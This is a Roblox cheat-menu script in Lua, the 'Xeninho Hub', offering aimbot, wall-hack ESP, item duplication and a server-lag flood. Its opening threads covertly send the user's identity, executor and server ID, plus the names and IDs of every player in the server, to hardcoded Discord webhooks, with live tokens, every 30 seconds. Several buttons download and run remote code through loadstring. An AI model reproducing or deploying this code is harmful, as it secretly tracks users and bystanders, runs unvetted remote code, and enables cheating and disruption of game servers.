-- WEBHOOK PRO (ORIGINAL)
task.spawn(function()
    pcall(function()
        local req = request or http_request or (syn and syn.request)
        if not req then return end

        local HttpService = game:GetService("HttpService")
        local Players = game:GetService("Players")
        local MarketplaceService = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")

        local player = Players.LocalPlayer
        local placeId = game.PlaceId
        local jobId = game.JobId

        local gameName = "Desconhecido"
        pcall(function()
            gameName = MarketplaceService:GetProductInfo(placeId).Name
        end)

        local executor = "Desconhecido"
        pcall(function()
            if identifyexecutor then
                executor = identifyexecutor()
            elseif getexecutorname then
                executor = getexecutorname()
            elseif syn then
                executor = "Synapse X"
            elseif fluxus then
                executor = "Fluxus"
            elseif KRNL_LOADED then
                executor = "KRNL"
            end
        end)

        local platform = "Desconhecido"
        pcall(function()
            platform = UserInputService:GetPlatform().Name
        end)

        local accountAge = player.AccountAge
        local altStatus = accountAge < 30 and "⚠️ POSSÍVEL ALT" or "OK"

        local avatar, gameIcon, gameBanner

        pcall(function()
            local res = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=false")
            local data = HttpService:JSONDecode(res)
            if data and data.data and data.data[1] then avatar = data.data[1].imageUrl end
        end)

        pcall(function()
            local res = game:HttpGet("https://thumbnails.roblox.com/v1/games/icons?universeIds="..game.GameId.."&size=512x512&format=Png")
            local data = HttpService:JSONDecode(res)
            if data and data.data and data.data[1] then gameIcon = data.data[1].imageUrl end
        end)

        pcall(function()
            local res = game:HttpGet("https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds="..game.GameId.."&size=768x432&format=Png")
            local data = HttpService:JSONDecode(res)
            if data and data.data and data.data[1] and data.data[1].thumbnails then
                gameBanner = data.data[1].thumbnails[1].imageUrl
            end
        end)

        req({
            Url = "https://discord.com/api/webhooks/1488335049576157358/rM78z6lBE5LPVRZa2ba25SQw4zNasFD6M1Cit-nnL_LZ39NzMF_gJ08htMRxv9I2t26Z",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "Xeninho Hub",
                avatar_url = gameIcon or avatar or "",
                embeds = {{
                    title = "☯️ Nova Execução Detectada",
                    description = "> **"..player.Name.."** executou o Xeninho Hub",
                    color = 43775,
                    author = {name = "Xeninho Hub", icon_url = avatar or ""},
                    thumbnail = {url = avatar or ""},
                    image = {url = gameBanner or ""},
                    fields = {
                        {name = "👤 Player", value = "`"..player.Name.."`", inline = true},
                        {name = "🆔 UserId", value = "`"..player.UserId.."`", inline = true},
                        {name = "⚙️ Executor", value = "`"..executor.."`", inline = true},
                        {name = "🎮 Jogo", value = "`"..gameName.."`"},
                        {name = "📱 Plataforma", value = "`"..platform.."`", inline = true},
                        {name = "📆 Conta", value = "`"..accountAge.." dias`", inline = true},
                        {name = "🚨 Status", value = "`"..altStatus.."`", inline = true},
                        {name = "🌎 Servidor", value = "```"..jobId.."```"}
                    },
                    footer = {text = "Xeninho Hub • "..os.date("%d/%m/%Y %H:%M:%S")}
                }}
            })
        })
    end)
end)

-- ===================== MONITOR DE JOGADORES (separado, não interfere em nada) =====================
task.spawn(function()
    local req = request or http_request or (syn and syn.request)
    if not req then return end

    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")

    local MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1493753168637591744/nhWdMGLCuCoMpIcldoxRFu7J6ZCQ-4BJWCuB1T-6ftIl_aE2nrFHIzHgMdGovK6q2yMR"
    local jobId = game.JobId

    local gameName = "Desconhecido"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local gameIcon = ""
    pcall(function()
        local res = game:HttpGet("https://thumbnails.roblox.com/v1/games/icons?universeIds="..game.GameId.."&size=512x512&format=Png")
        local data = HttpService:JSONDecode(res)
        if data and data.data and data.data[1] then gameIcon = data.data[1].imageUrl end
    end)

    local function buildEmbed()
        local allPlayers = Players:GetPlayers()
        local playerLines = {}

        for _, p in pairs(allPlayers) do
            local line = "`" .. p.DisplayName .. "` (@" .. p.Name .. ") — ID: `" .. p.UserId .. "`"
            table.insert(playerLines, line)
        end

        local playersText = table.concat(playerLines, "\n")
        if playersText == "" then
            playersText = "Nenhum jogador encontrado."
        end
        if #playersText > 1024 then
            playersText = string.sub(playersText, 1, 1020) .. "\n..."
        end

        return {
            username = "Xeninho Hub",
            avatar_url = gameIcon,
            embeds = {{
                title = "☯️ Monitoramento de Servidor",
                description = "**Jogo:** " .. gameName .. "\n**Servidor (Job ID):** `" .. jobId .. "`\n**Jogadores Online:** " .. #allPlayers .. "/" .. Players.MaxPlayers,
                color = 43775,
                fields = {
                    {
                        name = "👥 Jogadores no Servidor",
                        value = playersText,
                        inline = false
                    }
                },
                footer = {text = "Xeninho Hub Monitor • " .. os.date("%d/%m/%Y %H:%M:%S")}
            }}
        }
    end

    -- Primeira mensagem: envia e pega o ID pra editar depois
    local messageId = nil
    pcall(function()
        local res = req({
            Url = MONITOR_WEBHOOK .. "?wait=true",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(buildEmbed())
        })
        if res and res.Body then
            local data = HttpService:JSONDecode(res.Body)
            if data and data.id then
                messageId = data.id
            end
        end
    end)

    task.wait(30)

    -- Loop: edita a mesma mensagem a cada 30 segundos
    while true do
        pcall(function()
            if messageId then
                req({
                    Url = MONITOR_WEBHOOK .. "/messages/" .. messageId,
                    Method = "PATCH",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(buildEmbed())
                })
            else
                local res = req({
                    Url = MONITOR_WEBHOOK .. "?wait=true",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(buildEmbed())
                })
                if res and res.Body then
                    local data = HttpService:JSONDecode(res.Body)
                    if data and data.id then
                        messageId = data.id
                    end
                end
            end
        end)

        task.wait(30)
    end
end)

-- ===================== GUI =====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)

local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

-- CONSTANTES DE ESTILO
local MAIN_BG_COLOR = Color3.fromRGB(15, 15, 20)
local ACCENT_COLOR = Color3.fromRGB(0, 170, 255)
local TEXT_COLOR = Color3.fromRGB(255, 255, 255)
local INACTIVE_TEXT_COLOR = Color3.fromRGB(130, 130, 140)
local CARD_BG_COLOR = Color3.fromRGB(30, 30, 35)
local CARD_HOVER_COLOR = Color3.fromRGB(45, 45, 50)
local ERROR_COLOR = Color3.fromRGB(200, 40, 40)
local BUTTON_DEFAULT_COLOR = Color3.fromRGB(35, 35, 40)

-- BACKGROUND (com fade-in)
local Background = Instance.new("Frame", ScreenGui)
Background.Size = UDim2.new(1,0,1,0)
Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
Background.BackgroundTransparency = 1

TweenService:Create(Background, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0.35
}):Play()

-- BLUR
local blur = Instance.new("BlurEffect")
blur.Size = 18
blur.Parent = Lighting

-- MAIN FRAME
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0,0,0,0)
Main.Position = UDim2.new(0.5, -140, 0.5, -180)
Main.BackgroundColor3 = MAIN_BG_COLOR
Main.BackgroundTransparency = 0.05
Main.ClipsDescendants = true
Main.Active = true
pcall(function() Main.Draggable = true end)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0,18)


-- BORDA RGB LENTA
local Stroke = Instance.new("UIStroke", Main)
Stroke.Thickness = 2
Stroke.Transparency = 0.4
task.spawn(function()
    local hue = 0
    while Main.Parent do
        hue += 0.002
        if hue > 1 then hue = 0 end
        Stroke.Color = Color3.fromHSV(hue,1,1)
        task.wait(0.05)
    end
end)

-- ANIMAÇÃO DE ABERTURA
TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0,280,0,360)
}):Play()

-- ===================== TOPO =====================
local TopBar = Instance.new("Frame", Main)
TopBar.Size = UDim2.new(1,0,0,40)
TopBar.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(1,-100,1,0)
Title.Position = UDim2.new(0,15,0,0)
Title.Text = "Xeninho Hub ☯️"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextColor3 = TEXT_COLOR
Title.BackgroundTransparency = 1
Title.TextXAlignment = Enum.TextXAlignment.Left

-- Separador da TopBar
local TopBarSep = Instance.new("Frame", Main)
TopBarSep.Size = UDim2.new(1,-20,0,1)
TopBarSep.Position = UDim2.new(0,10,0,40)
TopBarSep.BackgroundColor3 = ACCENT_COLOR
TopBarSep.BackgroundTransparency = 0.7

-- BOTÃO FECHAR (sem fundo, com hover)
local Close = Instance.new("TextButton", TopBar)
Close.Size = UDim2.new(0,32,0,32)
Close.Position = UDim2.new(1,-34,0,6)
Close.Text = "X"
Close.Font = Enum.Font.GothamBold
Close.TextSize = 14
Close.TextColor3 = TEXT_COLOR
Close.BackgroundTransparency = 1

Close.MouseEnter:Connect(function()
    TweenService:Create(Close, TweenInfo.new(0.15), {TextColor3 = ERROR_COLOR}):Play()
end)
Close.MouseLeave:Connect(function()
    TweenService:Create(Close, TweenInfo.new(0.15), {TextColor3 = TEXT_COLOR}):Play()
end)

-- BOTÃO MINIMIZAR (sem fundo, com hover)
local Minimize = Instance.new("TextButton", TopBar)
Minimize.Size = UDim2.new(0,32,0,32)
Minimize.Position = UDim2.new(1,-62,0,6)
Minimize.Text = "-"
Minimize.Font = Enum.Font.GothamBold
Minimize.TextSize = 16
Minimize.TextColor3 = TEXT_COLOR
Minimize.BackgroundTransparency = 1

Minimize.MouseEnter:Connect(function()
    TweenService:Create(Minimize, TweenInfo.new(0.15), {TextColor3 = ACCENT_COLOR}):Play()
end)
Minimize.MouseLeave:Connect(function()
    TweenService:Create(Minimize, TweenInfo.new(0.15), {TextColor3 = TEXT_COLOR}):Play()
end)

-- ===================== TABS =====================
local Tabs = Instance.new("Frame", Main)
Tabs.Size = UDim2.new(1,0,0,32)
Tabs.Position = UDim2.new(0,0,0,42)
Tabs.BackgroundTransparency = 1
Tabs.ClipsDescendants = true

-- INDICADOR DE TAB (mais grosso, arredondado)
local Indicator = Instance.new("Frame", Tabs)
Indicator.Size = UDim2.new(0.33,0,0,4)
Indicator.Position = UDim2.new(0,0,1,-4)
Indicator.BackgroundColor3 = ACCENT_COLOR
Instance.new("UICorner", Indicator).CornerRadius = UDim.new(0,4)

local function createTab(name, pos)
    local btn = Instance.new("TextButton", Tabs)
    btn.Size = UDim2.new(0.33,0,1,0)
    btn.Position = UDim2.new(pos,0,0,0)
    btn.Text = name
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.BackgroundTransparency = 1
    btn.TextColor3 = INACTIVE_TEXT_COLOR
    return btn
end

local CombatTab = createTab("Combat", 0)
local PlayerTab = createTab("Player", 0.33)
local MiscTab = createTab("Misc", 0.66)

-- Separador entre Tabs e Conteúdo
local ContentSep = Instance.new("Frame", Main)
ContentSep.Size = UDim2.new(1,-20,0,1)
ContentSep.Position = UDim2.new(0,10,0,74)
ContentSep.BackgroundColor3 = TEXT_COLOR
ContentSep.BackgroundTransparency = 0.9

-- ===================== CONTAINERS =====================
local function createContainer()
    local c = Instance.new("ScrollingFrame", Main)
    c.Size = UDim2.new(1,0,1,-105)
    c.Position = UDim2.new(0,0,0,78)
    c.BackgroundTransparency = 1
    c.ScrollBarThickness = 3
    c.ScrollBarImageColor3 = ACCENT_COLOR
    c.CanvasSize = UDim2.new(0,0,0,0)

    local UIList = Instance.new("UIListLayout", c)
    UIList.Padding = UDim.new(0,8)
    UIList.FillDirection = Enum.FillDirection.Vertical
    UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIList.VerticalAlignment = Enum.VerticalAlignment.Top
    UIList.SortOrder = Enum.SortOrder.LayoutOrder

    local pad = Instance.new("UIPadding", c)
    pad.PaddingTop = UDim.new(0,6)
    pad.PaddingLeft = UDim.new(0,10)
    pad.PaddingRight = UDim.new(0,10)

    UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        c.CanvasSize = UDim2.new(0,0,0,UIList.AbsoluteContentSize.Y + 16)
    end)

    return c
end

local CombatFrame = createContainer()
local PlayerFrame = createContainer()
local MiscFrame = createContainer()

PlayerFrame.Visible = false
MiscFrame.Visible = false

-- ===================== SWITCH TAB =====================
local function switchTab(frame, button, pos)
    CombatFrame.Visible = false
    PlayerFrame.Visible = false
    MiscFrame.Visible = false

    frame.Visible = true

    TweenService:Create(Indicator, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {
        Position = UDim2.new(pos,0,1,-4)
    }):Play()

    TweenService:Create(CombatTab, TweenInfo.new(0.2), {TextColor3 = INACTIVE_TEXT_COLOR}):Play()
    TweenService:Create(PlayerTab, TweenInfo.new(0.2), {TextColor3 = INACTIVE_TEXT_COLOR}):Play()
    TweenService:Create(MiscTab, TweenInfo.new(0.2), {TextColor3 = INACTIVE_TEXT_COLOR}):Play()

    TweenService:Create(button, TweenInfo.new(0.2), {TextColor3 = ACCENT_COLOR}):Play()
end

CombatTab.MouseButton1Click:Connect(function()
    switchTab(CombatFrame, CombatTab, 0)
end)

PlayerTab.MouseButton1Click:Connect(function()
    switchTab(PlayerFrame, PlayerTab, 0.33)
end)

MiscTab.MouseButton1Click:Connect(function()
    switchTab(MiscFrame, MiscTab, 0.66)
end)

-- Aba inicial ativa
CombatTab.TextColor3 = ACCENT_COLOR

-- ===================== BOTÕES (CARDS) =====================
local function makeButton(parent, text, color, desc)
    local card = Instance.new("Frame", parent)
    card.Size = UDim2.new(1,0,0,52)
    card.BackgroundColor3 = CARD_BG_COLOR
    card.BackgroundTransparency = 0.2
    card.LayoutOrder = #parent:GetChildren()
    Instance.new("UICorner", card).CornerRadius = UDim.new(0,10)

    local cardStroke = Instance.new("UIStroke", card)
    cardStroke.Thickness = 1
    cardStroke.Color = TEXT_COLOR
    cardStroke.Transparency = 0.88

    -- Hover no card
    card.MouseEnter:Connect(function()
        TweenService:Create(card, TweenInfo.new(0.15), {BackgroundColor3 = CARD_HOVER_COLOR}):Play()
    end)
    card.MouseLeave:Connect(function()
        TweenService:Create(card, TweenInfo.new(0.15), {BackgroundColor3 = CARD_BG_COLOR}):Play()
    end)

    -- Botão clicável dentro do card
    local btn = Instance.new("TextButton", card)
    btn.Size = UDim2.new(1,0,1,0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.ZIndex = 5

    -- Nome da função (em cima)
    local nameLabel = Instance.new("TextLabel", card)
    nameLabel.Size = UDim2.new(1,-16,0,20)
    nameLabel.Position = UDim2.new(0,10,0,6)
    nameLabel.Text = text
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = 14
    nameLabel.TextColor3 = TEXT_COLOR
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left

    -- Descrição (embaixo)
    local descLabel = Instance.new("TextLabel", card)
    descLabel.Size = UDim2.new(1,-16,0,16)
    descLabel.Position = UDim2.new(0,10,0,28)
    descLabel.Text = desc
    descLabel.Font = Enum.Font.Gotham
    descLabel.TextSize = 11
    descLabel.TextColor3 = INACTIVE_TEXT_COLOR
    descLabel.BackgroundTransparency = 1
    descLabel.TextXAlignment = Enum.TextXAlignment.Left

    -- Indicador de cor à esquerda
    local colorBar = Instance.new("Frame", card)
    colorBar.Size = UDim2.new(0,4,0.6,0)
    colorBar.Position = UDim2.new(0,0,0.2,0)
    colorBar.BackgroundColor3 = color
    Instance.new("UICorner", colorBar).CornerRadius = UDim.new(0,4)

    return btn, nameLabel
end

-- BOTÕES COMBAT
local LagButton, LagLabel = makeButton(CombatFrame, "Lag: OFF", ACCENT_COLOR, "Causa lag forçando envio massivo de dados")
local ESPButton, ESPLabel = makeButton(CombatFrame, "ESP: OFF", ACCENT_COLOR, "Ver players pelas paredes")
local ScriptButton, _ = makeButton(CombatFrame, "Script OP", ERROR_COLOR, "Menu com várias funções OP")
local AimbotButton, _ = makeButton(CombatFrame, "Aimbot", ACCENT_COLOR, "Trava a mira no player mais próximo")

-- BOTÕES PLAYER
local TPButton, _ = makeButton(PlayerFrame, "TP", ACCENT_COLOR, "Teleporta pra cima e volta à posição original")
local JumpButton, JumpLabel = makeButton(PlayerFrame, "Jump: OFF", Color3.fromRGB(200, 160, 0), "Pulo infinito")

-- BOTÕES MISC
local FPSButton, _ = makeButton(MiscFrame, "FPS Boost", Color3.fromRGB(0, 140, 200), "Otimizar desempenho")
local DuplicarButton, _ = makeButton(MiscFrame, "Duplicar", Color3.fromRGB(160, 0, 160), "Duplicar itens (Duels)")

-- ===================== FOOTER =====================
local Footer = Instance.new("TextLabel", Main)
Footer.Size = UDim2.new(1,0,0,20)
Footer.Position = UDim2.new(0,0,1,-24)
Footer.BackgroundTransparency = 1
Footer.Text = "dc ; r1chsoull"
Footer.Font = Enum.Font.GothamBold
Footer.TextSize = 15
Footer.ZIndex = 10

-- RGB no Footer
task.spawn(function()
    local hue = 0
    while Footer.Parent do
        hue += 0.005
        if hue > 1 then hue = 0 end
        Footer.TextColor3 = Color3.fromHSV(hue, 0.7, 1)
        task.wait(0.1)
    end
end)

-- ===================== MINIMIZAR =====================
local minimized = false
Minimize.MouseButton1Click:Connect(function()
    minimized = not minimized

    CombatFrame.Visible = not minimized and (CombatTab.TextColor3 == ACCENT_COLOR)
    PlayerFrame.Visible = not minimized and (PlayerTab.TextColor3 == ACCENT_COLOR)
    MiscFrame.Visible = not minimized and (MiscTab.TextColor3 == ACCENT_COLOR)
    Footer.Visible = not minimized
    Tabs.Visible = not minimized
    TopBarSep.Visible = not minimized
    ContentSep.Visible = not minimized

    Background.BackgroundTransparency = minimized and 1 or 0.35
    blur.Size = minimized and 0 or 18

    TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size = minimized and UDim2.new(0,280,0,45) or UDim2.new(0,280,0,360)
    }):Play()
end)

-- ===================== FECHAR =====================
Close.MouseButton1Click:Connect(function()
    TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0,0,0,0)
    }):Play()
    TweenService:Create(Background, TweenInfo.new(0.2), {
        BackgroundTransparency = 1
    }):Play()
    task.wait(0.25)
    blur:Destroy()
    Background:Destroy()
    ScreenGui:Destroy()
end)

-- ================= FUNÇÕES =================

getgenv().auto = false
local lagThreads = {}

local function startLag()
    if not getgenv().auto then return end
    for i=1,10 do
        local thread = task.spawn(function()
            while getgenv().auto do task.wait()
                local player=game.Players.LocalPlayer
                local char=player.Character
                if char and char:FindFirstChild("Head") then
                    for _,tool in pairs(player.Backpack:GetChildren()) do
                        if tool:FindFirstChild("Throw") then
                            tool.Throw:FireServer(CFrame.new(char.Head.Position),Vector3.new())
                        end
                    end
                end
            end
        end)
        table.insert(lagThreads, thread)
    end
end

local function stopLag()
    for _, thread in ipairs(lagThreads) do
        task.cancel(thread)
    end
    lagThreads = {}
end

LagButton.MouseButton1Click:Connect(function()
    getgenv().auto = not getgenv().auto
    LagLabel.Text = "Lag: " .. (getgenv().auto and "ON" or "OFF")
    if getgenv().auto then
        startLag()
    else
        stopLag()
    end
end)

local isUp = false
local savedPosition

TPButton.MouseButton1Click:Connect(function()
    local char = game.Players.LocalPlayer.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    if not isUp then
        savedPosition = root.CFrame
        root.CFrame = root.CFrame + Vector3.new(0,100,0)
        isUp = true
    else
        if savedPosition then root.CFrame = savedPosition end
        isUp = false
    end
end)

local jump = false
local jumpThread = nil

JumpButton.MouseButton1Click:Connect(function()
    jump = not jump
    JumpLabel.Text = "Jump: " .. (jump and "ON" or "OFF")
    if jump then
        jumpThread = task.spawn(function()
            while jump do task.wait(0.15)
                local char = game.Players.LocalPlayer.Character
                if char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum and hum.FloorMaterial ~= Enum.Material.Air then
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end
            end
        end)
    else
        if jumpThread then
            task.cancel(jumpThread)
            jumpThread = nil
        end
    end
end)

local esp = false
local activeHighlights = {}

ESPButton.MouseButton1Click:Connect(function()
    esp = not esp
    ESPLabel.Text = "ESP: " .. (esp and "ON" or "OFF")

    if esp then
        for _,p in pairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer and p.Character then
                local hl = Instance.new("Highlight")
                hl.FillColor = Color3.fromRGB(255,0,0)
                hl.OutlineColor = Color3.fromRGB(255,255,255)
                hl.Parent = p.Character
                activeHighlights[p.UserId] = hl
            end
        end
    else
        for userId, hl in pairs(activeHighlights) do
            if hl and hl.Parent then
                hl:Destroy()
            end
        end
        activeHighlights = {}
    end
end)

-- Funções dos botões com loadstring
ScriptButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rysted/scripts/main/MurderersVSSheriffs.lua"))()
end)

AimbotButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Equinox-Hub/refs/heads/main/Aimbots/directions.lua", true))()
end)

FPSButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Optiz-FpsBooster-60070"))()
end)

DuplicarButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rysted/scripts/main/MurderersVSSheriffs/free_dupe_duels.lua"))()
end)

-- Monitorar jogadores que entram/saem para ESP
game.Players.PlayerAdded:Connect(function(player)
    if esp and player ~= game.Players.LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            if esp then
                local hl = Instance.new("Highlight")
                hl.FillColor = Color3.fromRGB(255,0,0)
                hl.OutlineColor = Color3.fromRGB(255,255,255)
                hl.Parent = char
                activeHighlights[player.UserId] = hl
            end
        end)
        if player.Character then
            local hl = Instance.new("Highlight")
            hl.FillColor = Color3.fromRGB(255,0,0)
            hl.OutlineColor = Color3.fromRGB(255,255,255)
            hl.Parent = player.Character
            activeHighlights[player.UserId] = hl
        end
    end
end)
